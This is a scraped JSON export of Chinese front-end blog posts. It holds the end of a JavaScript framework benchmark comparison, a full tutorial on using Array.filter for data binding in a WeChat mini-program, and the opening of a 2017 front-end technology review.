src=\"https://user-gold-cdn.xitu.io/2017/12/25/1608dac5693d87d4?w=767\u0026amp;h=575\u0026amp;f=png\u0026amp;s=26145\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/25/1608dac9b46bd235?w=752\u0026amp;h=452\u0026amp;f=png\u0026amp;s=24591\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e在启动时间方面，明显vue和react更加快，angular兄弟因为本身框架比较庞大，所以脚本在载入，启动时间，脚本大小等都不如其他的框架。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e内存占用\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e测试项目\u003c/th\u003e\n\u003cth\u003evanillajs\u003c/th\u003e\n\u003cth\u003evue-v2.5.3\u003c/th\u003e\n\u003cth\u003eangular-v5.0.0\u003c/th\u003e\n\u003cth\u003ereact-v16.1.0\u003c/th\u003e\n\u003cth\u003eangular-v1.6.3\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e页面加载后的内存占用\u003c/td\u003e\n\u003ctd\u003e3.0±0.1(1.0)\u003c/td\u003e\n\u003ctd\u003e3.6±0.1(1.2)\u003c/td\u003e\n\u003ctd\u003e6.7±0.1(2.2)\u003c/td\u003e\n\u003ctd\u003e3.7±0.1(1.2)\u003c/td\u003e\n\u003ctd\u003e4.3±0.1(1.4)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e增加1000行后的内存占用\u003c/td\u003e\n\u003ctd\u003e3.7±0.1(1.0)\u003c/td\u003e\n\u003ctd\u003e7.2±0.0(2.0)\u003c/td\u003e\n\u003ctd\u003e10.5±0.0(2.9)\u003c/td\u003e\n\u003ctd\u003e7.6±0.0(2.1)\u003c/td\u003e\n\u003ctd\u003e11.9±0.0(3.2)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e更新1000行中10的倍数行的内存占用\u003c/td\u003e\n\u003ctd\u003e3.7±0.1(1.0)\u003c/td\u003e\n\u003ctd\u003e7.3±0.0(2.0)\u003c/td\u003e\n\u003ctd\u003e10.6±0.0(2.9)\u003c/td\u003e\n\u003ctd\u003e8.5±0.0(2.3)\u003c/td\u003e\n\u003ctd\u003e11.9±0.0(3.2)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e替换1000行内容5次后的内存占用\u003c/td\u003e\n\u003ctd\u003e3.6±0.1(1.0)\u003c/td\u003e\n\u003ctd\u003e7.3±0.0(2.0)\u003c/td\u003e\n\u003ctd\u003e10.8±0.0(3.1)\u003c/td\u003e\n\u003ctd\u003e9.0±0.0(2.5)\u003c/td\u003e\n\u003ctd\u003e12.4±0.0(3.5)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e创建1000行内容5次后的内存占用\u003c/td\u003e\n\u003ctd\u003e3.2±0.0(1.0)\u003c/td\u003e\n\u003ctd\u003e3.8±0.0(1.2)\u003c/td\u003e\n\u003ctd\u003e7.1±0.0(2.2)\u003c/td\u003e\n\u003ctd\u003e4.7±0.0(1.5)\u003c/td\u003e\n\u003ctd\u003e4.7±0.0(1.5)\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/25/1608dae98ae157e3?w=866\u0026amp;h=452\u0026amp;f=png\u0026amp;s=26301\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n在内存占用上，angular兄弟依然都是偏大的，但是angularJS的增长趋势还是算比较低的，而angular的增长趋势也比较大了，vue的增长趋势也比较稳定，但是react在大量替换和更新操作上，开销增长较大，稳定性不强。\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e总结\u003c/h3\u003e\n\u003cp\u003e可以看出，在各个方面vanillajs都是胜出的，想要得到更好的性能优化，不仅仅是选择框架。还需要思考怎样更好的使用vanillajs，贴近浏览器来思考操作，从框架更新原理来思考逻辑，才能得到更好的性能。\u003c/p\u003e\n\u003cp\u003e数据来源：\u003ca target=\"_blank\" href=\"https://github.com/krausest/js-framework-benchmark\"\u003ejs-framework-benchmark\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1514890485.9549","__v":0}
{"_id":{"$oid":"5a4b76da2239bd131cd79f46"},"id":"5a2f432a5188252ae93ae807","author":{"$oid":"5a4b76d92239bd131cd79f2e"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/15/1605a91692559e91?w=316\u0026h=517\u0026f=gif\u0026s=1392930","https://user-gold-cdn.xitu.io/2017/12/15/1605a93a7081e2d0?w=316\u0026h=517\u0026f=gif\u0026s=412360","https://user-gold-cdn.xitu.io/2017/12/16/1605affa2dd0a358?w=496\u0026h=223\u0026f=png\u0026s=4932","https://user-gold-cdn.xitu.io/2017/12/16/1605b3c54dba9f66?w=316\u0026h=546\u0026f=gif\u0026s=396290","https://user-gold-cdn.xitu.io/2017/12/16/1605b3daf6ed0cd7?w=199\u0026h=119\u0026f=png\u0026s=1954"],"screenShot":null}],"title":"当微信小程序遇上filter~","meta":{"likeCount":0},"tag":["前端","微信"],"comment":[],"shortContent":"前段时间被安利了一个很实用的公众号—前端早读课，它简洁、大方的页面和方便、实用的功能深深地吸引着我~(＾Ｕ＾)ノ 恰好这段时间学了小程序，就自己仿着写了个前端早读课的小程序。 整个项目包括“每日一看”、“看看世界”、“情报局”和“介绍”四个主页面。 filter 是一个基于数组…","content":"\u003cp\u003e在微信小程序的开发过程中，当你想要实现不同页面间的数据绑定，却为此抓耳饶腮时，不妨让微信小程序与filter 来一场完美的邂逅，相信会给你带来别样的惊喜~\u003c/p\u003e\n\u003cp\u003e前段时间被安利了一个很实用的公众号—前端早读课，它简洁、大方的页面和方便、实用的功能深深地吸引着我~(＾Ｕ＾)ノ  恰好这段时间学了小程序，就自己仿着写了个前端早读课的小程序。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e实现的功能\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e不同页面间的数据绑定\u003c/li\u003e\n\u003cli\u003e随机显示数组里的元素\u003c/li\u003e\n\u003cli\u003e实时显示系统的日期\u003c/li\u003e\n\u003cli\u003e鼠标点击和页面跳转等基本功能\u003c/li\u003e\n\u003cli\u003eswiper组件和template样式模板的使用\u003c/li\u003e\n\u003cli\u003e使用easy mock模拟后台数据并进行动态传参\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003e项目展示\u003c/h2\u003e\n\u003cp\u003e整个项目包括“每日一看”、“看看世界”、“情报局”和“介绍”四个主页面。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/15/1605a91692559e91?w=316\u0026amp;h=517\u0026amp;f=gif\u0026amp;s=1392930\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e完美邂逅~\u003c/h2\u003e\n\u003cp\u003e在开发“每日一看”页面的过程中，我遇到了一个难题，如何将“每日一看”页面中获取的数据与阅读详情页的数据绑定起来，也就是从这时起，\u003cstrong\u003e微信小程序开始邂逅filter~\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/15/1605a93a7081e2d0?w=316\u0026amp;h=517\u0026amp;f=gif\u0026amp;s=412360\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e下面简单介绍一下filter~\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003efilter华丽登场~\u003c/h2\u003e\n\u003cp\u003efilter 是一个基于数组的方法，通过一个回调函数对数组进行筛选，并返回数组中满足条件的元素，相当于过滤器的效果。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003efilter的三要素\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e数组对象(arry)\u003c/p\u003e\n\u003cp\u003e每个filter 方法都有一个数组对象，通过该方法对数组里的元素进行筛选。\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e 具体用法： arry.filter();\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e回调函数(callbackfn)\u003c/p\u003e\n\u003cp\u003e对于数组中的每个元素，filter 方法都会调用callbackfn 函数一次。\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e 具体用法： function callbackfn(value, index, array);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e其中 value 表示数组元素的值，index 表示数组元素的下标， array 表示包含该元素的数组。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e返回值\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003efilter 方法的返回值是一个数组，包含所有满足回调函数条件的值。\u003c/strong\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e更多详情： \u003ca target=\"_blank\" href=\"https://msdn.microsoft.com/zh-cn/library/ff679973(v=vs.94).aspx\"\u003efilter文档\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e别样的惊喜~\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003efilter的骚操作—实现数据的动态绑定\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e敲黑板的重点来啦！！！\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e在 \u003cstrong\u003edairy.wxml\u003c/strong\u003e 页面中用 navigator 组件实现 ‘每日一看’ 页面和 ‘阅读详情’ 页的跳转，并传递一个 id 参数，每篇文章都有唯一的一个 id，这样就可以通过 js  使用 filter 过滤器筛选出两个 id 相等的文章数据，也就实现了数据的动态绑定。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;navigator url=\u003cspan class=\"hljs-string\"\u003e\"./detail/detail?id={{id}}\"\u003c/span\u003e\u0026gt;\n    \u0026lt;button class=\u003cspan class=\"hljs-string\"\u003e\"page_bd_motto_read\"\u003c/span\u003e\u0026gt;阅读\u0026lt;/button\u0026gt;\n\u0026lt;/navigator\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003col start=\"2\"\u003e\n\u003cli\u003e在 \u003cstrong\u003edairy.js\u003c/strong\u003e 中，因为页面每次都是随机显示一篇文章，这时就需要获取该文章的id，并作为参数，当页面跳转时作为一个钩子把两个页面联系起来。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ethat.setData({\n            headline: arr[index].headline,\n            from: arr[index].from,\n            // 设置id作为阅读详情页的一个钩子\n            id: arr[index].acticle_id\n          })\n        }\n      })\n\u003c/code\u003e\u003c/pre\u003e\u003col start=\"3\"\u003e\n\u003cli\u003e当页面跳转到详情页时，在 \u003cstrong\u003edetail.js\u003c/strong\u003e 中使用 filter 把 acticle_id 等于上一页面文章 id 的数据赋值给 datas，再对其进行操作，就实现了数据的动态绑定。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ePage({\n  data: {\n    // 表示该篇文章\n    item: []\n  },\n  onLoad: \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(params) {\n    // 检验id是否传递成功\n    console.log(params.id);\n    var that = this;\n    wx.request({\n      url: \u003cspan class=\"hljs-string\"\u003e'https://www.easy-mock.com/mock/5a2b5f76158e7b70032804d0/getActicleInfo/getActicleInfo'\u003c/span\u003e,\n      success: \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(res) {\n        // 使用过滤器把id等于上一页面id的数组赋值给datas\n        var datas = res.data.data.acticle_List.filter(item =\u0026gt; {\n          \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e item.acticle_id == params.id;\n        });\n        that.setData({\n          item: datas\n        });\n        console.log(datas);\n      }\n    })\n\n  }\n})\n\u003c/code\u003e\u003c/pre\u003e\u003col start=\"4\"\u003e\n\u003cli\u003e在 \u003cstrong\u003edetail.wxml\u003c/strong\u003e 中对传入的 item 数据进行调用，于是别样的惊喜就出现啦~\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;!--pages/dairy/detail/detail.wxml--\u0026gt;\n    \u0026lt;view class=\u003cspan class=\"hljs-string\"\u003e\"page__hd\"\u003c/span\u003e\u0026gt;\n        \u0026lt;view class=\u003cspan class=\"hljs-string\"\u003e\"page__hd_title center\"\u003c/span\u003e\u0026gt;{{item[0].headline}}\u0026lt;/view\u0026gt;\n        \u0026lt;view class=\u003cspan class=\"hljs-string\"\u003e\"page__hd_author\"\u003c/span\u003e\u0026gt;作者：@{{item[0].author}}\u0026lt;/view\u0026gt;\n    \u0026lt;/view\u0026gt;\n    \u0026lt;view class=\u003cspan class=\"hljs-string\"\u003e\"page__bd\"\u003c/span\u003e\u0026gt;\n        \u0026lt;text class=\u003cspan class=\"hljs-string\"\u003e\"page__bd_content center\"\u003c/span\u003e\u0026gt;{{item[0].content}}\u0026lt;/text\u0026gt;\n    \u0026lt;/view\u0026gt;\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e特别注意：\u003c/strong\u003e 可能有细心的人儿已经发现为什么这里用的是 \u003cstrong\u003eitem[0].\u003c/strong\u003e 来调用，而不是 **item.**来调用，这是数据索引的问题。如下图所示，我的数据是个三级结构，\u003cstrong\u003eitem\u003c/strong\u003e 表示的是最外层的文章数组元素，要获取文章的作者或标题等信息，必须使用 \u003cstrong\u003eitem[0].\u003c/strong\u003e 才能进行调用。\u003cstrong\u003e只有理解数据索引的本质，才能准确地调用数据。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/16/1605affa2dd0a358?w=496\u0026amp;h=223\u0026amp;f=png\u0026amp;s=4932\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e于是，小程序在遇上filter后，就创造出了别样的惊喜 O(∩_∩)O~\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e一起排坑~\u003c/h2\u003e\n\u003cp\u003e在开发过程中，遇到了一些坑，在此总结一下~\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e1. 随机显示数组里的元素\u003c/h3\u003e\n\u003cp\u003e这个公众号一大亮点就是可以随机显示文章，每次点进去的文章都不一样，感受度极佳。这里采用\u003cstrong\u003e随机函数\u003c/strong\u003e来获取数组的下标，Math.random()函数是获取[0,1)之间的数，Math.floor()函数是向下取整，这样就可以随机获取相应的下标数。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e onLoad: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n    var that = this;\n      wx.request({\n        url: \u003cspan class=\"hljs-string\"\u003e'https://www.easy-mock.com/mock/5a2b5f76158e7b70032804d0/getActicleInfo/getActicleInfo'\u003c/span\u003e,\n        method: \u003cspan class=\"hljs-string\"\u003e'GET'\u003c/span\u003e,\n        data: {},\n        success: \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(res) {\n          //获取文章数据的列表\n          var arr = res.data.data.acticle_List;\n          //用随机函数随机获取数组的下标\n          var index = Math.floor(Math.random()*arr.length);\n          // console.log(arr[index].acticle_id);\n          that.setData({\n            headline: arr[index].headline,\n            from: arr[index].from,\n            // 设置id作为阅读详情页的一个钩子\n            id: arr[index].acticle_id\n          })\n        }\n      })\n  },\n})\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e2. 实时显示系统的日期\u003c/h3\u003e\n\u003cp\u003e之前开发的时候觉得这个方法如果自己写还蛮难的，后面百度了一下，发现js里面提供了相应的API，直接使用就好，特别方便。\u003ca target=\"_blank\" href=\"https://msdn.microsoft.com/zh-cn/library/ff679973(v=vs.94).aspx\"\u003e有关系统时间的API\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e  //监听页面显示\n  // day：星期几\n  // date：某日\n  // month：月份\n  onShow: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n      var myDate = new Date();\n      // \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eData设置或更新数据\n      this.setData({\n        date: myDate.getDate(),\n        month: myDate.getMonth() + 1,\n        day: week(),\n      });\n      \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e week(day) {\n          switch(myDate.getDay()) {\n            \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e 1: day=\u003cspan class=\"hljs-string\"\u003e\"星期一\"\u003c/span\u003e; \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e;\n            \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e 2: day=\u003cspan class=\"hljs-string\"\u003e\"星期二\"\u003c/span\u003e; \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e;\n            \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e 3: day=\u003cspan class=\"hljs-string\"\u003e\"星期三\"\u003c/span\u003e; \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e;\n            \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e 4: day=\u003cspan class=\"hljs-string\"\u003e\"星期四\"\u003c/span\u003e; \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e;\n            \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e 5: day=\u003cspan class=\"hljs-string\"\u003e\"星期五\"\u003c/span\u003e; \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e;\n            \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e 6: day=\u003cspan class=\"hljs-string\"\u003e\"星期六\"\u003c/span\u003e; \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e;\n            default: day=\u003cspan class=\"hljs-string\"\u003e\"星期天\"\u003c/span\u003e;\n          }\n          \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e day;\n        }\n  },\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e3. 用hover实现鼠标点击效果\u003c/h3\u003e\n\u003cp\u003e在对首页进行鼠标点击效果的开发过程中，一开始想到的就是使用伪元素来添加点击按钮的样式效果，后面出现了一个bug，当我点击按钮跳转到另一个页面，再回退到原页面时，还是处于点击态的样式，这时百度就起了很大的作用，我上网百度了很久，才发现有hover属性中的hover-stay-time为动画持续的时间，hover-class 为定义点击按钮时的样式，于是这个bug就解决啦~\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;view class=\u003cspan class=\"hljs-string\"\u003e\"page__bd\"\u003c/span\u003e\u0026gt;\n    \u0026lt;view class=\u003cspan class=\"hljs-string\"\u003e\"page__bd_tab\"\u003c/span\u003e hover-class=\u003cspan class=\"hljs-string\"\u003e\"active\"\u003c/span\u003e hover-stay-time=\u003cspan class=\"hljs-string\"\u003e\"2000\"\u003c/span\u003e\u0026gt;\n      \u0026lt;view class=\u003cspan class=\"hljs-string\"\u003e\"page__bd_tab_item\"\u003c/span\u003e hover-class=\u003cspan class=\"hljs-string\"\u003e\"active1\"\u003c/span\u003e hover-stay-time=\u003cspan class=\"hljs-string\"\u003e\"2000\"\u003c/span\u003e bindtap=\u003cspan class=\"hljs-string\"\u003e\"dairyRead\"\u003c/span\u003e\u0026gt;每日一看\u0026lt;/view\u0026gt;\n      \u0026lt;view class=\u003cspan class=\"hljs-string\"\u003e\"page__bd_tab_item\"\u003c/span\u003e hover-class=\u003cspan class=\"hljs-string\"\u003e\"active1\"\u003c/span\u003e hover-stay-time=\u003cspan class=\"hljs-string\"\u003e\"2000\"\u003c/span\u003e bindtap=\u003cspan class=\"hljs-string\"\u003e\"lookWorld\"\u003c/span\u003e\u0026gt;看看世界\u0026lt;/view\u0026gt;\n      \u0026lt;view class=\u003cspan class=\"hljs-string\"\u003e\"page__bd_tab_item\"\u003c/span\u003e hover-class=\u003cspan class=\"hljs-string\"\u003e\"active1\"\u003c/span\u003e hover-stay-time=\u003cspan class=\"hljs-string\"\u003e\"2000\"\u003c/span\u003e bindtap=\u003cspan class=\"hljs-string\"\u003e\"intelligence\"\u003c/span\u003e\u0026gt;情报局\u0026lt;/view\u0026gt;\n      \u0026lt;view class=\u003cspan class=\"hljs-string\"\u003e\"page__bd_tab_item\"\u003c/span\u003e hover-class=\u003cspan class=\"hljs-string\"\u003e\"active1\"\u003c/span\u003e hover-stay-time=\u003cspan class=\"hljs-string\"\u003e\"2000\"\u003c/span\u003e bindtap=\u003cspan class=\"hljs-string\"\u003e\"introduction\"\u003c/span\u003e\u0026gt;简介\u0026lt;/view\u0026gt;\n    \u0026lt;/view\u0026gt;\n  \u0026lt;/view\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e4. 页面左右滑动的效果\u003c/h3\u003e\n\u003cp\u003e使用swiper组件实现对页面的左右滑动的效果。\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/16/1605b3c54dba9f66?w=316\u0026amp;h=546\u0026amp;f=gif\u0026amp;s=396290\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e5. template 模板样式的使用\u003c/h3\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/16/1605b3daf6ed0cd7?w=199\u0026amp;h=119\u0026amp;f=png\u0026amp;s=1954\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n当一串代码面临复制粘贴时，这时就应该考虑对其进行封装，这样直接在不同的地方调用就好了，也完成了代码的优化。小程序中的 template 模板就很好地帮我们解决了这个问题，并通过 is 属性来实现调用。\u003cp\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003etemplate 模板的定义：\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;!--pages/common/list_intelligence/list_intelligence.wxml--\u0026gt;\n\u0026lt;template name = \u003cspan class=\"hljs-string\"\u003e\"intelligence_list\"\u003c/span\u003e\u0026gt;\n \u0026lt;view class=\u003cspan class=\"hljs-string\"\u003e\"page__cell\"\u003c/span\u003e\u0026gt;\n    \u0026lt;view class=\u003cspan class=\"hljs-string\"\u003e\"page__cell_headline center\"\u003c/span\u003e\u0026gt;\n        \u0026lt;view class=\u003cspan class=\"hljs-string\"\u003e\"page__cell_headline_img\"\u003c/span\u003e\u0026gt;\n            \u0026lt;image src=\u003cspan class=\"hljs-string\"\u003e\"{{avatar}}\"\u003c/span\u003e/\u0026gt;\n        \u0026lt;/view\u0026gt;\n\n        \u0026lt;view class=\u003cspan class=\"hljs-string\"\u003e\"page__cell_headline_author\"\u003c/span\u003e\u0026gt;{{author}}分享于\u0026lt;/view\u0026gt;\n        \u0026lt;view class=\u003cspan class=\"hljs-string\"\u003e\"page__cell_headline_time\"\u003c/span\u003e\u0026gt;{{share_time}}\u0026lt;/view\u0026gt;\n    \u0026lt;/view\u0026gt;\n    \u0026lt;view class=\u003cspan class=\"hljs-string\"\u003e\"page__cell_detail center\"\u003c/span\u003e\u0026gt;{{content}}\u0026lt;/view\u0026gt;\n \u0026lt;/view\u0026gt;\n\u0026lt;/template\u0026gt;\n\n\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003etemplate 模板的调用：\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e  \u0026lt;view class=\u003cspan class=\"hljs-string\"\u003e\"page__bd\"\u003c/span\u003e\u0026gt;\n    \u0026lt;block wx:\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"{{intelligence_list}}\"\u003c/span\u003e wx:key=\u003cspan class=\"hljs-string\"\u003e\"{{index}}\"\u003c/span\u003e center \u0026gt;\n        \u0026lt;template is=\u003cspan class=\"hljs-string\"\u003e\"intelligence_list\"\u003c/span\u003e data=\u003cspan class=\"hljs-string\"\u003e\"{{...item}}\"\u003c/span\u003e\u0026gt;\u0026lt;/template\u0026gt;\n    \u0026lt;/block\u0026gt;\n  \u0026lt;/view\u0026gt;\n  \n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e我有话要说~\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e开发的过程中难免会出现各种各样的bug，记得一定要百度，百度，百度呀！！！这是个独立思考的过程，对能力的提高也非常有帮助~做这个项目最大的心得便是看太多不如干一场，肯定会干货满满，收获满满哟~\u003c/li\u003e\n\u003cli\u003e这个小程序后续还会完善，感兴趣的可以持续关注哟(＾Ｕ＾)ノ~\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 class=\"heading\"\u003e一波安利~\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003ch3 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://www.w3cschool.cn/weixinapp/9wou1q8j.html\"\u003e微信小程序开发教程手册\u003c/a\u003e\u003c/h3\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003ch3 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"https://mp.weixin.qq.com/debug/wxadoc/dev/component/view.html\"\u003e微信小程序官方开发文档\u003c/a\u003e\u003c/h3\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003ch3 class=\"heading\"\u003e使用 \u003ca target=\"_blank\" href=\"https://www.easy-mock.com/\"\u003eeasy-mock\u003c/a\u003e 构造后台虚拟数据\u003c/h3\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003ch3 class=\"heading\"\u003e使用微信开发者工具进行开发\u003c/h3\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 class=\"heading\"\u003e最后献上 \u003ca target=\"_blank\" href=\"https://github.com/XbaiAmy/wxapp_font_reading_class\"\u003egithub地址\u003c/a\u003e 里面有源代码，若是喜欢，希望大家给个star 鼓励一下啦~ღ( ´･ᴗ･` )比心\u003c/h4\u003e\n","buildTime":"1514894392.2535","__v":0}
{"_id":{"$oid":"5a4b76da2239bd131cd79f45"},"id":"5a45990a6fb9a044fb081242","author":{"$oid":"5a4b76d92239bd131cd79f2b"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"2017前端技术大盘点","meta":{"likeCount":0},"tag":["React.js","前端","JavaScript","Angular.js"],"comment":[],"shortContent":"临近2017的尾声，总是希望来盘点一下这一年中前端的发展。到目前为止，前端的井喷期也快临近尾声了。并不像几年前一样，总是会有层出不穷的新东西迸发出来。同时，前端技术也慢慢的趋于稳固，自成一套体系。如果你喜欢我的文章，欢迎评论，欢迎Star~。欢迎关注我的github博客 我们何…","content":"\u003ch1 class=\"heading\"\u003e前言\u003c/h1\u003e\n\u003cp\u003e临近2017的尾声，总是希望来盘点一下这一年中前端的发展。到目前为止，前端的井喷期也快临近尾声了。并不像几年前一样，总是会有层出不穷的新东西迸发出来。同时，前端技术也慢慢的趋于稳固，自成一套体系。如果你喜欢我的文章，欢迎评论，欢迎Star~。欢迎关注我的\u003ca target=\"_blank\" href=\"https://github.com/laizimo/zimo-article\"\u003egithub博客\u003c/a\u003e\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e正文\u003c/h1\u003e\n\u003cp\u003e我们何处说起？自然是离不开那三驾马车。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e三驾马车\u003c/h2\u003e\n\u003cp\u003e自从2015年，react的问世，开始了三驾马车时代的先河。同时，jQuery也逐渐让出了其霸主的地位。后续的，angular开始了大型的改版，似乎想要追逐react的步伐。两种完全不同思路的体现，在前端开发的技术栈中发光发亮。同时，Vue就像一匹黑马一样，一路披荆斩棘，快速地进步着。\u003c/p\u003e\n\u003cp\u003e因此，从2017年开始，3架马车可以说是并驾齐驱。似乎需要看些对比数据，来表示它们目前的现状。(来自国外的数据)\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"框架对于用户的满意度\" 